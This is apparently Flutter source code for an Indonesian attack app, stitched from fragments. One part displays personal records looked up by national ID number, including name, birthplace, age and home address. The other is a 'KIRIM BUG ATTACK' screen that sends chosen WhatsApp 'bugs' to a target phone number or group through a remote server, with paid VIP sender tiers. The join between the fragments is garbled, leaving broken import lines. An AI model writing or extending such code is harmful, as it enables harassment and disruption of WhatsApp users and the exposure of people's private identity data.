                          padding: const EdgeInsets.symmetric(vertical: 16),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                          elevation: 4,
                          shadowColor: primaryCyan.withOpacity(0.5),
                        ),
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(_isLoading ? Icons.hourglass_top : Icons.search, size: 20),
                            const SizedBox(width: 8),
                            Text(
                              _isLoading ? 'MEMPROSES...' : 'CEK DATA NIK',
                              style: const TextStyle(
                                fontSize: 16,
                                fontWeight: FontWeight.bold,
                                fontFamily: 'Orbitron',
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ],
                ),
              ),

              const SizedBox(height: 20),

              if (_errorMessage != null)
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: Colors.cyan.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: Colors.cyan.withOpacity(0.3)),
                  ),
                  child: Row(
                    children: [
                      Icon(Icons.error_outline, color: lightCyan),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Text(
                          _errorMessage!,
                          style: TextStyle(color: lightCyan, fontSize: 14),
                        ),
                      ),
                    ],
                  ),
                ),

              const SizedBox(height: 20),

              if (_data != null)
                Expanded(
                  child: FadeTransition(
                    opacity: _fadeAnimation,
                    child: SingleChildScrollView(
                      child: Column(
                        children: [
                          _buildCategoryCard(
                            title: "IDENTITAS DIRI",
                            icon: Icons.person,
                            children: [
                              _buildInteractiveInfoRow(
                                label: "NIK",
                                value: _data!["nik"]?.toString(),
                                onCopy: () => _copyToClipboard(_data!["nik"]?.toString() ?? "", "NIK"),
                              ),
                              _buildInteractiveInfoRow(
                                label: "Nama Lengkap",
                                value: _data!["data"]["nama"]?.toString(),
                                onCopy: () => _copyToClipboard(_data!["data"]["nama"]?.toString() ?? "", "Nama"),
                              ),
                              _buildInteractiveInfoRow(
                                label: "Jenis Kelamin",
                                value: _data!["data"]["kelamin"]?.toString(),
                              ),
                              _buildInteractiveInfoRow(
                                label: "Tempat Lahir",
                                value: _data!["data"]["tempat_lahir"]?.toString(),
                                onCopy: () => _copyToClipboard(_data!["data"]["tempat_lahir"]?.toString() ?? "", "Tempat Lahir"),
                              ),
                              _buildInteractiveInfoRow(
                                label: "Usia",
                                value: _data!["data"]["usia"]?.toString(),
                              ),
                            ],
                          ),

                          _buildCategoryCard(
                            title: "DATA DOMISILI",
                            icon: Icons.location_on,
                            children: [
                              _buildInteractiveInfoRow(
                                label: "Provinsi",
                                value: _data!["data"]["provinsi"]?.toString(),
                              ),
                              _buildInteractiveInfoRow(
                                label: "Kabupaten/Kota",
                                value: _data!["data"]["kabupaten"]?.toString(),
                              ),
                              _buildInteractiveInfoRow(
                                label: "Kecamatan",
                                value: _data!["data"]["kecamatan"]?.toString(),
                              ),
                              _buildInteractiveInfoRow(
                                label: "Kelurahan/Desa",
                                value: _data!["data"]["kelurahan"]?.toString(),
                              ),
                              _buildInteractiveInfoRow(
                                label: "Alamat Lengkap",
                                value: _data!["data"]["alamat"]?.toString(),
                                onCopy: () => _copyToClipboard(_data!["data"]["alamat"]?.toString() ?? "", "Alamat"),
                              ),
                              _buildInteractiveInfoRow(
                                label: "TPS",
                                value: _data!["data"]["tps"]?.toString(),
                              ),
                            ],
                          ),

                          _buildCategoryCard(
                            title: "INFORMASI TAMBAHAN",
                            icon: Icons.info,
                            children: [
                              _buildInteractiveInfoRow(
                                label: "Zodiak",
                                value: _data!["data"]["zodiak"]?.toString(),
                              ),
                              _buildInteractiveInfoRow(
                                label: "Ultah Mendatang",
                                value: _data!["data"]["ultah_mendatang"]?.toString(),
                              ),
                              _buildInteractiveInfoRow(
                                label: "Pasaran",
                                value: _data!["data"]["pasaran"]?.toString(),
                              ),
                            ],
                          ),
                        ],
                      ),
                    ),
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }
}


as math;

as http;




const _baseUrl = 'http://papi.queen-official.com:2836';

// ─── Palette ──────────────────────────────────────────────────────────────────
class _C {
  static const bg        = Color(0xFF060B14);
  static const surface   = Color(0xFF0C1424);
  static const card      = Color(0xFF101A2E);
  static const border    = Color(0xFF1A2D4A);
  static const borderLit = Color(0xFF1E3A5F);
  
  // DIUBAH: dari biru ke merah
  static const red       = Color(0xFFBD1B1B);      // merah gelap
  static const redMid    = Color(0xFFE82D2D);      // merah sedang
  static const redLight  = Color(0xFFF55656);      // merah terang
  static const redFrost  = Color(0xFFF79090);      // merah pastel
  
  static const green     = Color(0xFF22C55E);
  static const greenDim  = Color(0xFF16A34A);
  static const amber     = Color(0xFFF59E0B);
  static const purple    = Color(0xFF000000); // DIUBAH: dari ungu jadi hitam
  static const text      = Color(0xFFE2EDF9);
  static const textSub   = Color(0xFF7A9BBF);
  static const textDim   = Color(0xFF3A5470);

  // Gradient diubah ke merah
  static const LinearGradient btnGrad = LinearGradient(
    colors: [redMid, redLight],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
}

Color _roleColor(String role) {
  switch (role.toLowerCase()) {
    case 'owner':    return const Color(0xFFF59E0B);
    case 'admin':    return const Color(0xFFEF4444);
    case 'moderator': return const Color(0xFF22C55E);
    case 'partner':  return const Color(0xFF000000); // DIUBAH: dari ungu jadi hitam
    case 'vip':      return const Color(0xFF000000); // DIUBAH: dari ungu jadi hitam
    case 'reseller': return const Color(0xFF22C55E);
    default:         return _C.redLight;
  }
}

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetCtrl = TextEditingController();

  String selectedBugId = '';
  String _bugMode      = 'number';   // number | group
  String _senderType   = 'private';  // private | global
  bool   _isSending    = false;
  String? _responseMsg;

  List<String> _globalSenders   = [];
  bool         _isLoadingSenders = false;

  late AnimationController _bgCtrl;
  late AnimationController _entranceCtrl;
  late AnimationController _sendBtnCtrl;
  late AnimationController _resultCtrl;
  late AnimationController _waveCtrl;

  late Animation<double> _entrance;
  late Animation<double> _sendPulse;
  late Animation<double> _sendGlow;
  late Animation<double> _resultFade;
  late Animation<Offset>  _resultSlide;

  late VideoPlayerController _videoCtrl;
  ChewieController? _chewieCtrl;
  bool _videoReady = false;

  bool get canAccessGlobalSender {
    final r = widget.role.toLowerCase();
    return r == 'owner' || 
           r == 'admin' || 
           r == 'moderator' || 
           r == 'partner' || 
           r == 'vip';
  }

  @override
  void initState() {
    super.initState();
    if (widget.listBug.isNotEmpty) selectedBugId = widget.listBug[0]['bug_id'];

    _bgCtrl = AnimationController(vsync: this, duration: const Duration(seconds: 16))..repeat();

    _entranceCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 900));
    _entrance = CurvedAnimation(parent: _entranceCtrl, curve: Curves.easeOutCubic);

    _sendBtnCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 1800))
      ..repeat(reverse: true);
    _sendPulse = Tween<double>(begin: 1.0, end: 1.05)
        .animate(CurvedAnimation(parent: _sendBtnCtrl, curve: Curves.easeInOut));
    _sendGlow = Tween<double>(begin: 0.25, end: 0.65)
        .animate(CurvedAnimation(parent: _sendBtnCtrl, curve: Curves.easeInOut));

    _resultCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 450));
    _resultFade  = CurvedAnimation(parent: _resultCtrl, curve: Curves.easeOut);
    _resultSlide = Tween<Offset>(begin: const Offset(0, 0.12), end: Offset.zero)
        .animate(CurvedAnimation(parent: _resultCtrl, curve: Curves.easeOutCubic));

    _waveCtrl = AnimationController(vsync: this, duration: const Duration(seconds: 3))..repeat();

    _entranceCtrl.forward();
    _initVideo();
    _loadGlobalSenders();
  }

  @override
  void dispose() {
    _bgCtrl.dispose();
    _entranceCtrl.dispose();
    _sendBtnCtrl.dispose();
    _resultCtrl.dispose();
    _waveCtrl.dispose();
    targetCtrl.dispose();
    _videoCtrl.dispose();
    _chewieCtrl?.dispose();
    super.dispose();
  }

  // ─── Video ────────────────────────────────────────────────────────────────
  void _initVideo() {
    _videoCtrl = VideoPlayerController.asset('assets/videos/banner.mp4');
    _videoCtrl.initialize().then((_) {
      if (!mounted) return;
      _videoCtrl.setVolume(0);
      setState(() {
        _chewieCtrl = ChewieController(
          videoPlayerController: _videoCtrl,
          autoPlay: true,
          looping: true,
          showControls: false,
        );
        _videoReady = true;
      });
    });
  }

  // ─── Load Global Senders dari Server ──────────────────────────────────────
  Future<void> _loadGlobalSenders() async {
    setState(() => _isLoadingSenders = true);
    try {
      final res = await http.get(Uri.parse(
        '$_baseUrl/getActiveSenders?key=${widget.sessionKey}',
      )).timeout(const Duration(seconds: 10));

      final data = jsonDecode(res.body);
      if (data['valid'] == true && data['senders'] != null) {
        if (mounted) setState(() => _globalSenders = List<String>.from(data['senders']));
      } else {
        if (mounted) setState(() => _globalSenders = []);
      }
    } catch (_) {
      if (mounted) setState(() => _globalSenders = []);
    } finally {
      if (mounted) setState(() => _isLoadingSenders = false);
    }
  }

  // ─── Send ─────────────────────────────────────────────────────────────────
  Future<void> _sendBug() async {
    final rawInput = targetCtrl.text.trim();
    final key      = widget.sessionKey;

    // Validasi input
    if (_bugMode == 'number') {
      if (formatPhone(rawInput) == null) {
        _showAlert('Nomor Tidak Valid', 'Gunakan format internasional.\nContoh: +62812xxxxxxxx');
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert('Link Tidak Valid',
            'Masukkan link grup WhatsApp yang valid.\nContoh: https://chat.whatsapp.com/XXX');
        return;
      }
    }

    if (_senderType == 'global' && !canAccessGlobalSender) {
      _showAlert('Akses Ditolak', 'Sender Global hanya untuk Owner, Admin, Moderator, Partner & VIP!');
      return;
    }

    if (selectedBugId.isEmpty) {
      _showAlert('Pilih Bug', 'Silakan pilih bug terlebih dahulu.');
      return;
    }

    setState(() { _isSending = true; _responseMsg = null; });
    _resultCtrl.reset();

    try {
      final encodedTarget = Uri.encodeComponent(rawInput);
      final url = Uri.parse(
        '$_baseUrl/sendBug'
        '?key=$key'
        '&target=$encodedTarget'
        '&bug=$selectedBugId'
        '${_senderType == 'global' ? '&senderMode=global' : ''}',
      );

      final res  = await http.get(url).timeout(const Duration(seconds: 15));
      final data = jsonDecode(res.body);

      if (data['valid'] == false) {
        _setResponse('error', 'Session key tidak valid. Silakan login ulang.');
      } else if (data['cooldown'] == true) {
        final wait = data['wait'] ?? 0;
        _setResponse('warning', 'Cooldown aktif! Tunggu $wait detik lagi.');
      } else if (data['sended'] == true) {
        final label = _bugMode == 'group' ? 'grup target' : rawInput;
        final role  = data['role'] ?? widget.role;
        _setResponse('success', 'Bug berhasil dikirim ke $label! [$role]');
        targetCtrl.clear();
      } else {
        _setResponse('error', 'Gagal mengirim. Server sedang maintenance.');
      }
    } on Exception catch (e) {
      if (e.toString().contains('TimeoutException')) {
        _setResponse('error', 'Request timeout. Periksa koneksi internet.');
      } else {
        _setResponse('error', 'Koneksi error. Periksa jaringan dan coba lagi.');
      }
    } finally {
      if (mounted) setState(() => _isSending = false);
    }
  }

  void _setResponse(String type, String msg) {
    if (!mounted) return;
    setState(() => _responseMsg = '$type|$msg');
    _resultCtrl.forward(from: 0);
  }

  String? formatPhone(String s) {
    final c = s.replaceAll(RegExp(r'[^\d+]'), '');
    return (c.startsWith('+') && c.length >= 8) ? c : null;
  }

  bool isValidGroupLink(String s) =>
      s.startsWith('https://') && s.contains('chat.whatsapp.com');

  void _showAlert(String title, String msg) {
    showGeneralDialog(
      context: context,
      barrierDismissible: true,
      barrierLabel: '',
      barrierColor: Colors.black87,
      transitionDuration: const Duration(milliseconds: 300),
      transitionBuilder: (_, anim, __, child) => ScaleTransition(
        scale: CurvedAnimation(parent: anim, curve: Curves.easeOutBack),
        child: FadeTransition(opacity: anim, child: child),
      ),
      pageBuilder: (ctx, _, __) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 28),
        child: Container(
          decoration: BoxDecoration(
            color: _C.card,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: _C.amber.withOpacity(0.3), width: 1.5),
            boxShadow: [BoxShadow(color: _C.amber.withOpacity(0.12), blurRadius: 40)],
          ),
          padding: const EdgeInsets.all(26),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              width: 52, height: 52,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: _C.amber.withOpacity(0.1),
                border: Border.all(color: _C.amber.withOpacity(0.3)),
              ),
              child: const Icon(Icons.warning_amber_rounded, color: _C.amber, size: 26),
            ),
            const SizedBox(height: 14),
            Text(title, style: const TextStyle(color: _C.text, fontSize: 17,
                fontWeight: FontWeight.w800)),
            const SizedBox(height: 8),
            Text(msg, textAlign: TextAlign.center,
                style: const TextStyle(color: _C.textSub, fontSize: 13, height: 1.5)),
            const SizedBox(height: 22),
            _GradBtn(label: 'OK', fullWidth: true, onTap: () => Navigator.pop(ctx)),
          ]),
        ),
      ),
    );
  }

  // ─── Build ────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      body: Stack(children: [
        Positioned.fill(child: _AnimatedBg(controller: _bgCtrl)),
        SafeArea(
          child: FadeTransition(
            opacity: _entrance,
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              padding: const EdgeInsets.fromLTRB(16, 12, 16, 40),
              child: Column(children: [
                _buildProfileCard(),
                const SizedBox(height: 16),
                _buildVideoCard(),
                const SizedBox(height: 20),
                _buildModeToggle(),
                const SizedBox(height: 16),
                _buildTargetInput(),
                const SizedBox(height: 14),
                _buildBugSelector(),
                const SizedBox(height: 14),
                _buildSenderCard(),
                const SizedBox(height: 28),
                _buildSendButton(),
                const SizedBox(height: 12),
                if (_responseMsg != null) _buildResultBanner(),
              ]),
            ),
          ),
        ),
      ]),
    );
  }

  Widget _buildProfileCard() {
    final rColor = _roleColor(widget.role);
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _C.border),
        boxShadow: [BoxShadow(color: _C.red.withOpacity(0.07), blurRadius: 20, offset: const Offset(0, 6))],
      ),
      child: Row(children: [
        Container(
          width: 52, height: 52,
          decoration: BoxDecoration(
            color: rColor.withOpacity(0.1),
            shape: BoxShape.circle,
            border: Border.all(color: rColor.withOpacity(0.4), width: 2),
            boxShadow: [BoxShadow(color: rColor.withOpacity(0.25), blurRadius: 14)],
          ),
          child: Icon(Icons.person_rounded, color: rColor, size: 26),
        ),
        const SizedBox(width: 14),
        Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text(widget.username, style: const TextStyle(color: _C.text, fontSize: 16,
              fontWeight: FontWeight.w800, letterSpacing: -0.3)),
          const SizedBox(height: 4),
          Row(children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
              decoration: BoxDecoration(
                color: rColor.withOpacity(0.1),
                borderRadius: BorderRadius.circular(6),
                border: Border.all(color: rColor.withOpacity(0.3)),
              ),
              child: Text(widget.role.toUpperCase(),
                  style: TextStyle(color: rColor, fontSize: 10,
                      fontWeight: FontWeight.w800, letterSpacing: 0.8)),
            ),
            const SizedBox(width: 8),
            Text('Exp: ${widget.expiredDate}',
                style: const TextStyle(color: _C.textSub, fontSize: 11)),
          ]),
        ])),
        Column(children: [
          Container(
            width: 8, height: 8,
            decoration: const BoxDecoration(shape: BoxShape.circle, color: _C.green,
                boxShadow: [BoxShadow(color: Color(0x5522C55E), blurRadius: 8)]),
          ),
          const SizedBox(height: 3),
          const Text('LIVE', style: TextStyle(color: _C.green, fontSize: 8,
              fontWeight: FontWeight.w800, letterSpacing: 0.5)),
        ]),
      ]),
    );
  }

  Widget _buildVideoCard() {
    return Container(
      clipBehavior: Clip.hardEdge,
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _C.borderLit),
        boxShadow: [BoxShadow(color: _C.red.withOpacity(0.12), blurRadius: 24, offset: const Offset(0, 8))],
      ),
      child: _videoReady && _chewieCtrl != null
          ? Stack(children: [
              AspectRatio(aspectRatio: _videoCtrl.value.aspectRatio,
                  child: Chewie(controller: _chewieCtrl!)),
              Positioned(top: 0, left: 0, right: 0,
                child: Container(height: 2,
                  decoration: const BoxDecoration(gradient: LinearGradient(
                    colors: [Colors.transparent, _C.redMid, Colors.transparent])))),
            ])
          : const SizedBox(height: 180, child: Center(child: _DotsLoader())),
    );
  }

  Widget _buildModeToggle() {
    return Container(
      padding: const EdgeInsets.all(4),
      decoration: BoxDecoration(
        color: _C.surface,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _C.border),
      ),
      child: Row(children: [
        _ModeTab(icon: Icons.phone_android_rounded, label: 'Bug Nomor',
          active: _bugMode == 'number',
          onTap: () => setState(() { _bugMode = 'number'; targetCtrl.clear(); })),
        _ModeTab(icon: Icons.group_rounded, label: 'Bug Group',
          active: _bugMode == 'group',
          onTap: () => setState(() { _bugMode = 'group'; targetCtrl.clear(); })),
      ]),
    );
  }

  Widget _buildTargetInput() {
    return _InputSection(
      icon: _bugMode == 'number' ? Icons.phone_android_rounded : Icons.link_rounded,
      label: _bugMode == 'number' ? 'Nomor Target' : 'Link Grup WhatsApp',
      child: _BugInput(
        controller: targetCtrl,
        hint: _bugMode == 'number' ? 'Contoh: +62812xxxxxxxx' : 'Contoh: https://chat.whatsapp.com/...',
        keyboardType: _bugMode == 'number' ? TextInputType.phone : TextInputType.url,
        icon: _bugMode == 'number' ? Icons.phone_android_rounded : Icons.link_rounded,
      ),
    );
  }

  Widget _buildBugSelector() {
    return _InputSection(
      icon: Icons.bug_report_rounded,
      label: 'Pilih Bug',
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 4),
        decoration: BoxDecoration(
          color: _C.surface,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _C.border),
        ),
        child: DropdownButtonHideUnderline(
          child: DropdownButton<String>(
            value: selectedBugId.isNotEmpty ? selectedBugId : null,
            isExpanded: true,
            dropdownColor: _C.card,
            icon: const Icon(Icons.expand_more_rounded, color: _C.textSub, size: 20),
            style: const TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.w500),
            items: widget.listBug.map((bug) {
              return DropdownMenuItem<String>(
                value: bug['bug_id'],
                child: Row(children: [
                  Container(width: 7, height: 7,
                      decoration: BoxDecoration(shape: BoxShape.circle,
                          color: _C.redLight.withOpacity(0.7))),
                  const SizedBox(width: 10),
                  Text(bug['bug_name'], style: const TextStyle(color: _C.text)),
                ]),
              );
            }).toList(),
            onChanged: (v) => setState(() => selectedBugId = v ?? ''),
          ),
        ),
      ),
    );
  }

  Widget _buildSenderCard() {
    return Container(
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _C.border),
        boxShadow: [BoxShadow(color: _C.red.withOpacity(0.06), blurRadius: 20, offset: const Offset(0, 6))],
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          decoration: BoxDecoration(border: Border(bottom: BorderSide(color: _C.border.withOpacity(0.6)))),
          child: Row(children: [
            Container(
              width: 34, height: 34,
              decoration: BoxDecoration(color: _C.red.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(9), border: Border.all(color: _C.borderLit)),
              child: const Icon(FontAwesomeIcons.server, color: _C.redLight, size: 14),
            ),
            const SizedBox(width: 12),
            const Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text('Sender Type', style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.w700)),
              Text('Pilih sumber nomor pengirim', style: TextStyle(color: _C.textSub, fontSize: 11)),
            ]),
            const Spacer(),
            // Refresh button
            GestureDetector(
              onTap: _loadGlobalSenders,
              child: Container(
                width: 30, height: 30,
                decoration: BoxDecoration(
                  color: _C.surface,
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: _C.border),
                ),
                child: _isLoadingSenders
                    ? const Padding(padding: EdgeInsets.all(7),
                        child: CircularProgressIndicator(strokeWidth: 2, color: _C.redLight))
                    : const Icon(Icons.refresh_rounded, color: _C.textSub, size: 16),
              ),
            ),
          ]),
        ),
        Padding(
          padding: const EdgeInsets.all(14),
          child: Row(children: [
            Expanded(child: _SenderOption(
              icon: FontAwesomeIcons.globe,
              label: 'Global',
              sublabel: _isLoadingSenders ? 'Loading...' : '${_globalSenders.length} sender',
              selected: _senderType == 'global',
              locked: !canAccessGlobalSender,
              onTap: () {
                if (!canAccessGlobalSender) {
                  _showAlert('Akses Ditolak', 'Sender Global hanya untuk Acces VIP! Buy Vip? 45K KePrasTzy');
                  return;
                }
                setState(() => _senderType = 'global');
                _loadGlobalSenders();
              },
            )),
            const SizedBox(width: 10),
            Expanded(child: _SenderOption(
              icon: FontAwesomeIcons.userShield,
              label: 'Private',
              sublabel: 'Session lu sendiri',
              selected: _senderType == 'private',
              locked: false,
              onTap: () => setState(() => _senderType = 'private'),
            )),
          ]),
        ),
        if (_senderType == 'global' && _globalSenders.isNotEmpty)
          Container(
            margin: const EdgeInsets.fromLTRB(14, 0, 14, 14),
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(color: _C.surface, borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _C.border)),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Row(children: [
                const Icon(Icons.format_list_bulleted_rounded, color: _C.textSub, size: 13),
                const SizedBox(width: 6),
                Text('${_globalSenders.length} sender aktif',
                    style: const TextStyle(color: _C.textSub, fontSize: 11, fontWeight: FontWeight.w600)),
              ]),
              const SizedBox(height: 8),
              ...(_globalSenders.take(3).map((s) => Padding(
                padding: const EdgeInsets.only(bottom: 4),
                child: Row(children: [
                  Container(width: 5, height: 5,
                      decoration: const BoxDecoration(shape: BoxShape.circle, color: _C.green)),
                  const SizedBox(width: 8),
                  Text(s, style: const TextStyle(color: _C.redLight, fontSize: 11, fontFamily: 'monospace')),
                ]),
              ))),
              if (_globalSenders.length > 3)
                Text('+ ${_globalSenders.length - 3} lainnya...',
                    style: const TextStyle(color: _C.textDim, fontSize: 10)),
            ]),
          ),
      ]),
    );
  }

  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _sendBtnCtrl,
      builder: (_, __) => GestureDetector(
        onTap: _isSending ? null : _sendBug,
        child: Transform.scale(
          scale: _isSending ? 1.0 : _sendPulse.value,
          child: Container(
            height: 62, width: double.infinity,
            decoration: BoxDecoration(
              gradient: const LinearGradient(
                colors: [Color(0xFFBD1B1B), Color(0xFFE82D2D), Color(0xFFF55656)],
                begin: Alignment.topLeft, end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(18),
              boxShadow: [BoxShadow(
                color: _C.redMid.withOpacity(_isSending ? 0.2 : _sendGlow.value * 0.55),
                blurRadius: 28, offset: const Offset(0, 8),
              )],
            ),
            child: Stack(children: [
              if (_isSending)
                ClipRRect(
                  borderRadius: BorderRadius.circular(18),
                  child: AnimatedBuilder(
                    animation: _waveCtrl,
                    builder: (_, __) => CustomPaint(
                      painter: _WavePainter(_waveCtrl.value),
                      size: const Size(double.infinity, 62),
                    ),
                  ),
                ),
              Center(
                child: AnimatedSwitcher(
                  duration: const Duration(milliseconds: 250),
                  child: _isSending
                      ? const Row(key: ValueKey('sending'), mainAxisSize: MainAxisSize.min, children: [
                          SizedBox(width: 18, height: 18,
                              child: CircularProgressIndicator(strokeWidth: 2.5, color: Colors.white)),
                          SizedBox(width: 12),
                          Text('Mengirim Bug...', style: TextStyle(color: Colors.white,
                              fontWeight: FontWeight.w800, fontSize: 16)),
                        ])
                      : const Row(key: ValueKey('idle'), mainAxisSize: MainAxisSize.min, children: [
                          Icon(Icons.rocket_launch_rounded, color: Colors.white, size: 22),
                          SizedBox(width: 12),
                          Text('KIRIM BUG ATTACK', style: TextStyle(color: Colors.white,
                              fontWeight: FontWeight.w900, fontSize: 16, letterSpacing: 1.2)),
                        ]),
                ),
              ),
            ]),
          ),
        ),
      ),
    );
  }

  Widget _buildResultBanner() {
    if (_responseMsg == null) return const SizedBox();
    final parts = _responseMsg!.split('|');
    final type  = parts[0];
    final msg   = parts.length > 1 ? parts[1] : '';

    Color color;
    IconData icon;
    switch (type) {
      case 'success': color = _C.green;   icon = Icons.check_circle_rounded; break;
      case 'warning': color = _C.amber;   icon = Icons.warning_rounded; break;
      default:        color = _C.red;     icon = Icons.error_rounded;
    }

    return FadeTransition(
      opacity: _resultFade,
      child: SlideTransition(
        position: _resultSlide,
        child: Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: color.withOpacity(0.08),
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: color.withOpacity(0.35)),
            boxShadow: [BoxShadow(color: color.withOpacity(0.1), blurRadius: 16)],
          ),
          child: Row(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Container(width: 32, height: 32,
                decoration: BoxDecoration(shape: BoxShape.circle, color: color.withOpacity(0.12)),
                child: Icon(icon, color: color, size: 18)),
            const SizedBox(width: 12),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(
                type == 'success' ? 'Berhasil' : type == 'warning' ? 'Peringatan' : 'Gagal',
                style: TextStyle(color: color, fontSize: 13, fontWeight: FontWeight.w700),
              ),
              const SizedBox(height: 3),
              Text(msg, style: const TextStyle(color: _C.textSub, fontSize: 12, height: 1.4)),
            ])),
            GestureDetector(
              onTap: () { setState(() => _responseMsg = null); _resultCtrl.reset(); },
              child: const Icon(Icons.close_rounded, color: _C.textDim, size: 16),
            ),
          ]),
        ),
      ),
    );
  }
}

// ─── Widgets ──────────────────────────────────────────────────────────────────
class _ModeTab extends StatelessWidget {
  final IconData icon; final String label; final bool active; final VoidCallback onTap;
  const _ModeTab({required this.icon, required this.label, required this.active, required this.onTap});

  @override
  Widget build(BuildContext context) {
    return Expanded(
      child: GestureDetector(
        onTap: onTap,
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 220),
          padding: const EdgeInsets.symmetric(vertical: 12),
          decoration: BoxDecoration(
            color: active ? _C.redMid.withOpacity(0.15) : Colors.transparent,
            borderRadius: BorderRadius.circular(12),
            border: active ? Border.all(color: _C.redMid.withOpacity(0.4)) : null,
          ),
          child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
            Icon(icon, size: 16, color: active ? _C.redLight : _C.textDim),
            const SizedBox(width: 7),
            Text(label, style: TextStyle(color: active ? _C.redLight : _C.textDim,
                fontSize: 13, fontWeight: active ? FontWeight.w700 : FontWeight.w400)),
          ]),
        ),
      ),
    );
  }
}

class _InputSection extends StatelessWidget {
  final IconData icon; final String label; final Widget child;
  const _InputSection({required this.icon, required this.label, required this.child});

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(color: _C.card, borderRadius: BorderRadius.circular(18),
          border: Border.all(color: _C.border)),
      child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
          decoration: BoxDecoration(border: Border(bottom: BorderSide(color: _C.border.withOpacity(0.6)))),
          child: Row(children: [
            Icon(icon, color: _C.textSub, size: 15),
            const SizedBox(width: 8),
            Text(label, style: const TextStyle(color: _C.textSub, fontSize: 12, fontWeight: FontWeight.w600)),
          ]),
        ),
        Padding(padding: const EdgeInsets.all(12), child: child),
      ]),
    );
  }
}

class _BugInput extends StatefulWidget {
  final TextEditingController controller;
  final String hint;
  final TextInputType keyboardType;
  final IconData icon;
  const _BugInput({required this.controller, required this.hint,
      required this.keyboardType, required this.icon});

  @override
  State<_BugInput> createState() => _BugInputState();
}

class _BugInputState extends State<_BugInput> {
  bool _focused = false;
  final _focus = FocusNode();

  @override
  void initState() {
    super.initState();
    _focus.addListener(() => setState(() => _focused = _focus.hasFocus));
  }

  @override
  void dispose() { _focus.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return AnimatedContainer(
      duration: const Duration(milliseconds: 200),
      decoration: BoxDecoration(
        color: _C.surface,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: _focused ? _C.redMid : _C.border, width: _focused ? 1.5 : 1.0),
        boxShadow: _focused
            ? [BoxShadow(color: _C.redMid.withOpacity(0.1), blurRadius: 14, offset: const Offset(0, 4))]
            : [],
      ),
      child: TextField(
        controller: widget.controller,
        focusNode: _focus,
        keyboardType: widget.keyboardType,
        style: const TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.w500),
        cursorColor: _C.redMid,
        decoration: InputDecoration(
          hintText: widget.hint,
          hintStyle: const TextStyle(color: _C.textDim, fontSize: 13),
          prefixIcon: Icon(widget.icon, color: _focused ? _C.redLight : _C.textSub, size: 18),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
        ),
      ),
    );
  }
}

class _SenderOption extends StatefulWidget {
  final IconData icon; final String label; final String sublabel;
  final bool selected; final bool locked; final VoidCallback onTap;
  const _SenderOption({required this.icon, required this.label, required this.sublabel,
      required this.selected, required this.locked, required this.onTap});

  @override
  State<_SenderOption> createState() => _SenderOptionState();
}

class _SenderOptionState extends State<_SenderOption> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
